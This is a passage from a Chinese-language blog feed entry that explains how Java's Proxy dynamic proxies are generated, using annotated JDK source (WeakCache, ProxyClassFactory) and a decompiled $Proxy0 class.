(valuesMap.replace(subKey, supplier, factory)) &#123;</span><br><span class="line">                <span class="comment">// successfully replaced</span></span><br><span class="line">                <span class="comment">// cleared CacheEntry / unsuccessful Factory</span></span><br><span class="line">                <span class="comment">// with our Factory</span></span><br><span class="line">                supplier = factory;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// retry with current supplier</span></span><br><span class="line">                supplier = valuesMap.get(subKey);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="comment">// serialize access</span></span><br><span class="line">    <span class="comment">// re-check</span></span><br><span class="line">    Supplier&lt;V&gt; supplier = valuesMap.get(subKey);</span><br><span class="line">    <span class="keyword">if</span> (supplier != <span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="comment">// something changed while we were waiting:</span></span><br><span class="line">        <span class="comment">// might be that we were replaced by a CacheValue</span></span><br><span class="line">        <span class="comment">// or were removed because of failure -&gt;</span></span><br><span class="line">        <span class="comment">// return null to signal WeakCache.get() to retry</span></span><br><span class="line">        <span class="comment">// the loop</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// else still us (supplier == this)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// create new value</span></span><br><span class="line">    V value = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 触发 valueFactory.apply() 真正的构建</span></span><br><span class="line">        value = Objects.requireNonNull(valueFactory.apply(key, parameter));</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123; <span class="comment">// remove us on failure</span></span><br><span class="line">            valuesMap.remove(subKey, <span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// the only path to reach here is with non-null value</span></span><br><span class="line">    <span class="keyword">assert</span> value != <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wrap value with CacheValue (WeakReference)</span></span><br><span class="line">    CacheValue&lt;V&gt; cacheValue = <span class="keyword">new</span> CacheValue&lt;&gt;(value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// put into reverseMap</span></span><br><span class="line">    reverseMap.put(cacheValue, Boolean.TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try replacing us with CacheValue (this should always succeed)</span></span><br><span class="line">    <span class="keyword">if</span> (!valuesMap.replace(subKey, <span class="keyword">this</span>, cacheValue)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">"Should not reach here"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// successfully replaced us with new CacheValue -&gt; return the value</span></span><br><span class="line">    <span class="comment">// wrapped by it</span></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面两段代码的内容，都是在反复确认将要构建的生成类是否在过去曾经创建过，如果是，则直接返回过去构建的类实例;<br>否则才会尝试创建，并最终将这个构建的类也进行缓存。</p><p>下面这段代码来自于 <code>Proxy</code> 的内部类 <code>ProxyClassFactory</code><br>这部分，也终于开始了对代理类字节码的统筹性构造的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; apply(ClassLoader loader, Class&lt;?&gt;[] interfaces) &#123;</span><br><span class="line"></span><br><span class="line">    Map&lt;Class&lt;?&gt;, Boolean&gt; interfaceSet = <span class="keyword">new</span> IdentityHashMap&lt;&gt;(interfaces.length);</span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; intf : interfaces) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 校验当前接口是由同一个 ClassLoader (将要用来加载新的代理类)加载的</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class&lt;?&gt; interfaceClass = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            interfaceClass = Class.forName(intf.getName(), <span class="keyword">false</span>, loader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (interfaceClass != intf) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                    intf + <span class="string">" is not visible from class loader"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 校验当前 Class 对象确实是一个接口</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!interfaceClass.isInterface()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                    interfaceClass.getName() + <span class="string">" is not an interface"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 校验当前接口没有被要求重复进行代理增强</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (interfaceSet.put(interfaceClass, Boolean.TRUE) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                    <span class="string">"repeated interface: "</span> + interfaceClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String proxyPkg = <span class="keyword">null</span>;     <span class="comment">// 生成的代理类所属的 package</span></span><br><span class="line">    <span class="keyword">int</span> accessFlags = Modifier.PUBLIC | Modifier.FINAL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果代理的接口是非 PUBLIC ，那么生成的代理类的接口将与这个非 PUBLIC 接口</span></span><br><span class="line"><span class="comment">     * 在同一个包下。</span></span><br><span class="line"><span class="comment">     * 如果代理的接口有多个非 PUBLIC ，且分别位于不同的包下，那么抛出异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; intf : interfaces) &#123;</span><br><span class="line">        <span class="keyword">int</span> flags = intf.getModifiers();</span><br><span class="line">        <span class="keyword">if</span> (!Modifier.isPublic(flags)) &#123;</span><br><span class="line">            accessFlags = Modifier.FINAL;</span><br><span class="line">            String name = intf.getName();</span><br><span class="line">            <span class="keyword">int</span> n = name.lastIndexOf(<span class="string">'.'</span>);</span><br><span class="line">            String pkg = ((n == -<span class="number">1</span>) ? <span class="string">""</span> : name.substring(<span class="number">0</span>, n + <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">if</span> (proxyPkg == <span class="keyword">null</span>) &#123;</span><br><span class="line">                proxyPkg = pkg;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!pkg.equals(proxyPkg)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                        <span class="string">"non-public interfaces from different packages"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果代理的接口全是 PUBLIC 的，那么使用默认的包 com.sun.proxy</span></span><br><span class="line">    <span class="keyword">if</span> (proxyPkg == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// if no non-public proxy interfaces, use com.sun.proxy package</span></span><br><span class="line">        proxyPkg = ReflectUtil.PROXY_PACKAGE + <span class="string">"."</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 为将要生成的代理类选择一个全限定名</span></span><br><span class="line"><span class="comment">     * 规则是 包名 + "$Proxy" + &lt;唯一递增的id, 从0开始编号&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">long</span> num = nextUniqueNumber.getAndIncrement();</span><br><span class="line">    String proxyName = proxyPkg + proxyClassNamePrefix + num;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 生成一个特殊的代理类的字节码</span></span><br><span class="line"><span class="comment">     * byte[] proxyClassFile 就等同于 .class 文件的全部二进制内容。</span></span><br><span class="line"><span class="comment">     * 与 .class 文件的区别就在于一个写在了外存上，另一个完全在内存中创建</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">byte</span>[] proxyClassFile = ProxyGenerator.generateProxyClass(</span><br><span class="line">            proxyName, interfaces, accessFlags);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">          * 调用 ClassLoader 的 defineClass0(...) 方法加载字节码内容，构造 Class 对象</span></span><br><span class="line"><span class="comment">          * 本来 defineClass0(...) 方法是定义在 ClassLoader 中，但这里额外声明了一个本地方法 defineClass0(...)</span></span><br><span class="line"><span class="comment">          * 想来实现也是类似的，最终的目的也是加载 Class </span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">        <span class="keyword">return</span> defineClass0(loader, proxyName,</span><br><span class="line">                proxyClassFile, <span class="number">0</span>, proxyClassFile.length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * A ClassFormatError here means that (barring bugs in the</span></span><br><span class="line"><span class="comment">         * proxy class generation code) there was some other</span></span><br><span class="line"><span class="comment">         * invalid aspect of the arguments supplied to the proxy</span></span><br><span class="line"><span class="comment">         * class creation (such as virtual machine limitations</span></span><br><span class="line"><span class="comment">         * exceeded).</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在完成基础性的校验，并构造了生成类的类名等内容后，<br><code>ProxyGenerator.generateProxyClass</code> 将开始构造 <a href="https://docs.oracle.com/javase/specs/jvms/se9/html/jvms-4.html" target="_blank" rel="noopener">ClassFile</a> 的具体内容。</p><p>关于这部分生成字节码的内容，请在了解了 ClassFile 的基础性内容之后，在自行学习，内容全部在 ProxyGenerator 类中。</p><p>这部分的规则是(在构建新的代理生成类时):</p><ul><li>额外添加三个 Object 的方法 (<code>hashCode</code>, <code>equals</code>, <code>toString</code>)</li><li>逐一读取所有需要增强的接口的方法，并对重复方法进行判断; 如果方法名相同，入参数量与类型相同，但返回参数不同，则抛出异常</li><li>在遍历所有接口的方法的时候，同时也将为新的生成类构造新的字段(内容就是通过反射获取该方法)</li><li>最后将新的生成类将要包含的所有字段与方法进行构造，同时维护一个常量池内容</li><li>输出这些内容的二进制表示 byte[];</li></ul><h2 id="如何对方法增强"><a href="#如何对方法增强" class="headerlink" title="如何对方法增强"></a>如何对方法增强</h2><p>想必上了上一节，虽然对 Java 动态代理的调用链有了一定的了解。</p><p>但是，究竟 Proxy 是如何完成对实现类方法的增强呢？</p><p>也许我们需要先看一下生成类 .class 文件的一些内容来对这个命题形成基础性的影响。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Code <span class="title">getCode</span><span class="params">()</span> <span class="keyword">throws</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Code)<span class="keyword">super</span>.h.invoke(<span class="keyword">this</span>, m4, (Object[])<span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var2;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(var3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，生成类的 <code>getCode()</code> 方法几乎没有什么实质性的内容, 只是 <code>super.h.invoke(...)</code> 。</p><p><code>h</code> 实例变量是什么？<code>InvocationHandler</code> 的一个实例对象。</p><p>事实上，Java Proxy 生成类的每个方法结构几乎都是类似的。方法体的内容就是通过实例持有的 <code>h</code> 变量分发实际的操作指令</p><p>至于 h 的具体内容。:) 有编程者自定义，并在 Proxy 生成字节码，并被 ClassLoader 加载后，在准备实例化的时候作为构造参数进行传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ICodeFactory factory = (ICodeFactory) clazz.getConstructor(<span class="keyword">new</span> Class[] &#123; InvocationHandler.class &#125;).newInstance(<span class="keyword">new</span> Object[] &#123; handler &#125;);</span><br></pre></td></tr></table></figure><p>至于具体将做哪些增强，调用例如上例的 <code>ICodeFactory</code> 的那个实现类的方法，全部有使用者自定义。</p><h2 id="生成类的反编译结果"><a href="#生成类的反编译结果" class="headerlink" title="生成类的反编译结果"></a>生成类的反编译结果</h2><p>仍然以本文开始的 ICodeFactory 的增强为例，看一下究竟通过 Java Proxy 动态代理生成的字节码的反编译结果究竟是什么？<br>并以此来对这种动态代理机制形成更为直观的印象</p><p>在 Java 源代码中，虽然默认不会输出生成类的二进制内容，但是，仍然预留了打印 .class 文件的可选项。</p><p>有兴趣的同学可以看一下 <code>ProxyGenerator.saveGeneratedFiles</code> 字段的内容，这就决定是在构造代理类后是否存储到外存中。</p><p>想要看到代理类的字节码，直接通过在 Java 执行程序中添加一行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>, <span class="string">"true"</span>);</span><br></pre></td></tr></table></figure><p>或者在启动程序的 <code>java</code> 命令下添加参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dsun.misc.ProxyGenerator.saveGeneratedFiles=<span class="literal">true</span>`</span><br></pre></td></tr></table></figure><p>至于生成类将打印在哪，首先必然是在项目所属的目录下。有上一节中构造生成类全限定名的内容，根据包名的规则去寻找即可。(具体不再详述)</p><p>直接通过 IDEA, Eclipse 或者其它工具，对生成类 .class 文件进行反编译可以查看到整个生成类的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"><span class="keyword">import</span> me.fangfeng.jdk.proxy.Code;</span><br><span class="line"><span class="keyword">import</span> me.fangfeng.jdk.proxy.ICodeFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> $<span class="title">Proxy0</span> <span class="keyword">extends</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">ICodeFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m1;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m2;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m4;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m3;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method m0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler var1) <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">super</span>(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object var1)</span> <span class="keyword">throws</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Boolean)<span class="keyword">super</span>.h.invoke(<span class="keyword">this</span>, m1, <span class="keyword">new</span> Object[]&#123;var1&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> <span class="keyword">throws</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (String)<span class="keyword">super</span>.h.invoke(<span class="keyword">this</span>, m2, (Object[])<span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Code <span class="title">getCode</span><span class="params">()</span> <span class="keyword">throws</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Code)<span class="keyword">super</span>.h.invoke(<span class="keyword">this</span>, m4, (Object[])<span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setCode</span><span class="params">(Code var1)</span> <span class="keyword">throws</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.h.invoke(<span class="keyword">this</span>, m3, <span class="keyword">new</span> Object[]&#123;var1&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> <span class="keyword">throws</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (Integer)<span class="keyword">super</span>.h.invoke(<span class="keyword">this</span>, m0, (Object[])<span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UndeclaredThrowableException(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            m1 = Class.forName(<span class="string">"java.lang.Object"</span>).getMethod(<span class="string">"equals"</span>, Class.forName(<span class="string">"java.lang.Object"</span>));</span><br><span class="line">            m2 = Class.forName(<span class="string">"java.lang.Object"</span>).getMethod(<span class="string">"toString"</span>);</span><br><span class="line">            m4 = Class.forName(<span class="string">"me.fangfeng.jdk.proxy.ICodeFactory"</span>).getMethod(<span class="string">"getCode"</span>);</span><br><span class="line">            m3 = Class.forName(<span class="string">"me.fangfeng.jdk.proxy.ICodeFactory"</span>).getMethod(<span class="string">"setCode"</span>, Class.forName(<span class="string">"me.fangfeng.jdk.proxy.Code"</span>));</span><br><span class="line">            m0 = Class.forName(<span class="string">"java.lang.Object"</span>).getMethod(<span class="string">"hashCode"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodError(var2.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoClassDefFoundError(var3.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 Java 整个生态里面, 通用的有两类动态代理的应用: Java Proxy 与 CGlib 代理。&lt;/p&gt;
&lt;p&gt;从宽泛的区别来说，Java Proxy 只能对接口进行增强，而 CGlib 同时适用于类和接口的增强。&lt;br&gt;而且，业内普遍的认知是，CGlib 动态代理较之于 Java Proxy 在生成字节码的速度上也更为高效。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://DorMOUSE-None.github.io/tags/Java/"/>
    
      <category term="Proxy" scheme="https://DorMOUSE-None.github.io/tags/Proxy/"/>
    
  </entry>
  
</feed>
